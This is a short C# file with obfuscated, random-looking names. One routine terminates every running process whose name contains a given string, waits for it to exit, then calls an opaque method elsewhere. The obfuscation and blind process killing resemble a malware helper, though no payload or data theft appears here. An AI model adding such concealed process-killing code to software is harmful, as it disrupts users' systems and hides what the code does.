using System;
using System.Diagnostics;

namespace gZJMShdGuoGG;

public sealed class DMMKLKWzjhpB
{
	public static bool iFdAAUubDpu(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void BJWRowvjSbuTQS(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (iFdAAUubDpu(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					pMhSnWjBfMXV.FlYakovDxkPjro();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
